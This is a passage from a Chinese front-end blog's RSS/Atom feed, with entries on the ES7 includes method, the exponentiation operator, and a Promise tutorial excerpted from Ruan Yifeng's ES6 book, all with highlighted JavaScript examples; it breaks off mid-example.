width="200px"></p><blockquote><p>非常感谢<a href="https://github.com/liriliri" target="_blank" rel="noopener">liriliri</a>提供的<a href="https://github.com/liriliri/eruda" target="_blank" rel="noopener">eruda</a>工具，非常赞</p></blockquote><p>相同功能的工具：<a href="https://github.com/Tencent/vConsole/blob/dev/README_CN.md" target="_blank" rel="noopener">Tencent vConsole</a></p>]]></content>
    
    <summary type="html">
    
      移动端开发devtools迷你版
    
    </summary>
    
    
      <category term="JavaScript" scheme="http://pimichen.com/blog/tags/javascript/"/>
    
      <category term="Tools" scheme="http://pimichen.com/blog/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>ES7 includes方法</title>
    <link href="http://pimichen.com/blog/es7/es7-includes%E6%96%B9%E6%B3%95.html"/>
    <id>http://pimichen.com/blog/es7/es7-includes方法.html</id>
    <published>2018-10-21T16:00:00.000Z</published>
    <updated>2018-10-21T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>ES7只新增了2个新特性</p><ul><li><code>Array.prototype.includes</code></li><li>Exponentiation Operator(求幂运算)</li></ul><p>本文只讲解includes方法，Exponentiation Operator(求幂运算)请移步<a href="/es7/es7-求幂运算.html">ES7求幂运算</a></p><p><code>Array.prototype.includes</code>用法都容易和简单。它是一个替代<code>indexOf</code>（ES6新增），开发人员用来检查数组中是否存在值，<code>indexOf</code>是一种尴尬的使用，因为它返回一个元素在数组中的位置或者-1当这样的元素不能被找到的情况下。所以它返回一个数字，而不是一个布尔值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">'react'</span>, <span class="string">'angular'</span>, <span class="string">'vue'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// WRONG</span></span><br><span class="line"><span class="keyword">if</span> (arr.indexOf(<span class="string">'react'</span>)) &#123; <span class="comment">// 0 -&gt; evaluates to false, definitely as we expected</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Can use React'</span>) <span class="comment">// this line would never be executed</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Correct</span></span><br><span class="line"><span class="keyword">if</span> (arr.indexOf(<span class="string">'react'</span>) !== <span class="number">-1</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Can use React'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者使用一点点<code>hack</code> 位运算符 <code>~</code> 使代码更加紧凑一些，因为<code>~</code>（位异或）对任何数字相当于<code>-(a + 1)</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">'react'</span>, <span class="string">'angular'</span>, <span class="string">'vue'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// Correct</span></span><br><span class="line"><span class="keyword">if</span> (~arr.indexOf(<span class="string">'react'</span>)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Can use React'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在<code>ES7</code>中，可以使用<code>includes</code>开替代<code>indexOf</code>作为检测：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">'react'</span>, <span class="string">'angular'</span>, <span class="string">'vue'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// Correct</span></span><br><span class="line"><span class="keyword">if</span> (arr.includes(<span class="string">'react'</span>)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Can use React'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开发者还能在字符串中使用<code>includes</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">'React Quickly'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Correct</span></span><br><span class="line"><span class="keyword">if</span> (str.toLowerCase().includes(<span class="string">'react'</span>)) &#123;  <span class="comment">// true</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Found "react"'</span>)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>includes第二可选参数fromIndex，这对于优化是有好处的，因为它允许从特定位置开始寻找匹配。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>)) <span class="comment">// === true</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">4</span>)) <span class="comment">// === false</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, <span class="literal">NaN</span>].includes(<span class="literal">NaN</span>)) <span class="comment">// === true</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, <span class="number">-0</span>].includes(+<span class="number">0</span>)) <span class="comment">// === true</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, +<span class="number">0</span>].includes(<span class="number">-0</span>)) <span class="comment">// === true</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>].includes(<span class="string">'a'</span>)) <span class="comment">// === true</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>].includes(<span class="string">'a'</span>, <span class="number">1</span>)) <span class="comment">// === false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'React Quickly'</span>.includes(<span class="string">'React'</span>)) <span class="comment">// === true</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      es7includes方法解析
    
    </summary>
    
    
      <category term="ES7" scheme="http://pimichen.com/blog/tags/es7/"/>
    
  </entry>
  
  <entry>
    <title>ES7 求幂运算</title>
    <link href="http://pimichen.com/blog/es7/es7-%E6%B1%82%E5%B9%82%E8%BF%90%E7%AE%97.html"/>
    <id>http://pimichen.com/blog/es7/es7-求幂运算.html</id>
    <published>2018-10-21T16:00:00.000Z</published>
    <updated>2018-10-21T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>ES7只新增了2个新特性</p><ul><li><code>Array.prototype.includes</code></li><li>Exponentiation Operator(求幂运算)</li></ul><p>本文只讲解ES7求幂运算，includes方法请移步<a href="/es7/es7-includes方法.html">ES7 includes</a></p><p>在ES6中，可以使用<code>Math.pow</code>来实现求幂运算<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">3</span>); <span class="comment">// 8</span></span><br><span class="line"><span class="built_in">Math</span>.pow(<span class="number">3</span>, <span class="number">2</span>); <span class="comment">// 9</span></span><br></pre></td></tr></table></figure></p><p>ES7中，可以使用<code>**</code>来实习求幂运算<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> ** <span class="number">3</span> <span class="comment">// 8</span></span><br><span class="line"><span class="number">3</span> ** <span class="number">2</span> <span class="comment">// 9</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      es7求幂运算解析
    
    </summary>
    
    
      <category term="ES7" scheme="http://pimichen.com/blog/tags/es7/"/>
    
  </entry>
  
  <entry>
    <title>Promise对象</title>
    <link href="http://pimichen.com/blog/es6/es6-Promise%E5%AF%B9%E8%B1%A1.html"/>
    <id>http://pimichen.com/blog/es6/es6-Promise对象.html</id>
    <published>2018-10-20T16:00:00.000Z</published>
    <updated>2018-10-20T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘自：<a href="http://es6.ruanyifeng.com/#docs/promise" target="_blank" rel="noopener">阮一峰 ECMAScript 6 入门</a></p></blockquote><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Promise是异步编程的一种解决方案</p><p>所谓Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从语法上说，它是一个对象，从它可以获取异步操作的消息。</p><ul><li><p>对象的状态不受外界影响，Promise对象代表这一个异步操作，有三个状态：如下，只有异步操作的结果才可以决定当前是哪一种状态</p><ul><li>Pending（进行中）</li><li>Resolved（已完成，又称Fulled）</li><li>Rejected（已失败）</li></ul></li><li><p>一旦状态改变，就不会再变，任何时候都可以得到这个结果，Promised对象的状态改变，只有两种，如下：，只要这两种情况发生，状态就凝固了，不会再变了。会一直保持这个结果。</p><ul><li>从Pending变为Resolved</li><li>从Pending变为Rejected</li></ul></li></ul><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><ul><li>Promise对象是一个构造函数，用来生成Promise对象</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="comment">/* 异步操作成功时 */</span>) &#123;</span><br><span class="line">    resolve(value)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    reject(error)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>resolve函数的作用是，将Promise对象的状态从“未完成”变为“成功”（从Pending变为Resolved），在异步操作成功的时候调用，并将异步操作的结果，作为参数传递出去；<br>reject函数的作用是，将Promise对象的状态从“未完成”变为“失败”（从Pending变为Rejected），在异步操作失败的时候调用，并将异步操作返回的错误，作为参数传递出去。</p><ul><li>Promise实例生成之后，可以用then方法指定Resolved和Reject状态的回调函数，两个参数，一个成功回调，一个失败回调，第二个参数失败回调可选</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">promise.then(<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// success</span></span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// error</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>例如下例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">timeout</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(resolve, ms, <span class="string">'done'</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">timeout(<span class="number">100</span>).then(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上例中：timeout方法返回一个Promise实例，表示一段时间以后才会发生的结果。过了指定的时间（ms参数）以后，Promise实例的状态变为Resolved，就会触发then方法绑定的回调函数。</p><p>Promise新建后就会立即执行</p><p>例如下例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Promise'</span>);</span><br><span class="line">  resolve();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">promise.then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Resolved.'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Hi!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Promise</span></span><br><span class="line"><span class="comment">// Hi!</span></span><br><span class="line"><span class="comment">// Resolved</span></span><br></pre></td></tr></table></figure><p>上例中：Promise实例新建后立即执行，先输出“Promise”，然后then方法指定回调，当时回调会在当前脚本的同步方法之后才会执行，所以其次是输出“Hi！”，最后才会输出回调里面的“Resolved”</p><p>下面是异步加载图片的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadImageAsync</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> image = <span class="keyword">new</span> Image();</span><br><span class="line"></span><br><span class="line">    image.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      resolve(image);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    image.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Could not load image at '</span> + url));</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    image.src = url;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是用Promise对象实现Ajax操作的例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> getJSON = <span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    client.open(<span class="string">"GET"</span>, url);</span><br><span class="line">    client.onreadystatechange = handler;</span><br><span class="line">    client.responseType = <span class="string">"json"</span>;</span><br><span class="line">    client.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"application/json"</span>);</span><br><span class="line">    client.send();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handler</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.readyState !== <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">        resolve(<span class="keyword">this</span>.response);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="keyword">this</span>.statusText));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> promise;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">getJSON(<span class="string">"/posts.json"</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">json</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Contents: '</span> + json);</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(<span class="string">'出错了'</span>, error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>resolve函数参数除了可能是正常的值以外也可能是另一个Promise实例，即回调里面是请求，如下例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  resolve(p1);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>上例中：p1和p2都是Promise的实例，但是p2的resolve方法将p1作为参数，即p1的状态决定了p2的状态。如果p1是Pending，那么p2就必须要等待。如果p1是Resolved或Rejected，那么p2的回调函数将会立即执行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'fail'</span>)), <span class="number">3000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> resolve(p1), <span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p2</span><br><span class="line">  .then(<span class="function"><span class="params">result</span> =&gt;</span> <span class="built_in">console</span>.log(result))</span><br><span class="line">  .catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">console</span>.log(error))</span><br><span class="line"><span class="comment">// Error: fail</span></span><br></pre></td></tr></table></figure><p>上面代码中：p1是一个Promise，3s后变为rejected。p2的状态在1s之后改变，resolve方法返回的是p1。此时，由于p2返回的是另一个Promise，所以后面的then语句都变成针对后者（p1）。又过了2s，p1变为rejected，导致出发catch方法指定的回调函数。</p><h2 id="Promise-prototype-then"><a href="#Promise-prototype-then" class="headerlink" title="Promise.prototype.then()"></a>Promise.prototype.then()</h2><p>then方法是定义在原型对象Promise.prototype上的。它的作用是为Promise实例添加状态改变时的回调。前面说过，then方法的第一个参数是Resolved成功后的回调，第二个参数（可选）是Rejected失败后的回调。</p><p>then方法返回的是一个新的Promise实例，因此可以采用链式写法，及then方法后再调用一个then方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">"/posts.json"</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">json</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> json.post;</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">post</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面的代码中，使用then方法一次指定了两个回调，第一个回调完成以后，会将返回的结果作为参数，传入第二个回调。</p><p>这种链式的then可以指定一组按照次序调用的回调。这时，前一个回调有可能还是一个Promise实例，这时后一个就必须等待。如下例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">"/post/1.json"</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">post</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> getJSON(post.commentURL);</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span> <span class="title">funcA</span>(<span class="params">comments</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Resolved: "</span>, comments);</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span> <span class="title">funcB</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Rejected: "</span>, err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上例中：第一个then方法指定的回调是一个Promise实例。这时，第二个then方法指定的回调，就会等待这个新的Promise对象状态先发生变化。如果变为Resolved，就调用funcA，如果变为Rejected，就调用funcB。</p><p>采用箭头函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">"/post/1.json"</span>).then(</span><br><span class="line">  post =&gt; getJSON(post.commentURL)</span><br><span class="line">).then(</span><br><span class="line">  comments =&gt; <span class="built_in">console</span>.log(<span class="string">"Resolved: "</span>, comments),</span><br><span class="line">  err =&gt; <span class="built_in">console</span>.log(<span class="string">"Rejected: "</span>, err)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="Promise-prototype-catch"><a href="#Promise-prototype-catch" class="headerlink" title="Promise.prototype.catch()"></a>Promise.prototype.catch()</h2><p>Promise.ptototype.catch方法是.then(null, rejection)的别名，用于指定发生错误时的回调函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">'/posts.json'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">posts</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 处理 getJSON 和 前一个回调函数运行时发生的错误</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'发生错误！'</span>, error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上例中：如果该对象状态变为Resolved，会调用then方法指定的回调，如果异步操作抛出错误，状态就会变为Rejected，就会调用catch方法指定的回调。另外，如果运行中抛出错误，也会被catch捕获。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.then(<span class="function">(<span class="params">val</span>) =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'fulfilled:'</span>, val))</span><br><span class="line">  .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'rejected'</span>, err));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">p.then(<span class="function">(<span class="params">val</span>) =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'fulfilled:'</span>, val))</span><br><span class="line">  .then(<span class="literal">null</span>, (err) =&gt; <span class="built_in">console</span>.log(<span class="string">"rejected:"</span>, err));</span><br></pre></td></tr></table></figure><p>如下例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">promise.catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Error: test</span></span><br></pre></td></tr></table></figure><p>promise抛出一个错误，就会被catch方法指定的回调函数捕获。注意，上面的写法与下面两种写法是等价的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    reject(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">promise.catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>));</span><br><span class="line">&#125;);</span><br><span class="line">promise.catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上述也说明，reject方法的作用，等同于抛出错误。</p><p>如果Promise状态已经变成Resolved，再抛出错误是无效的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span 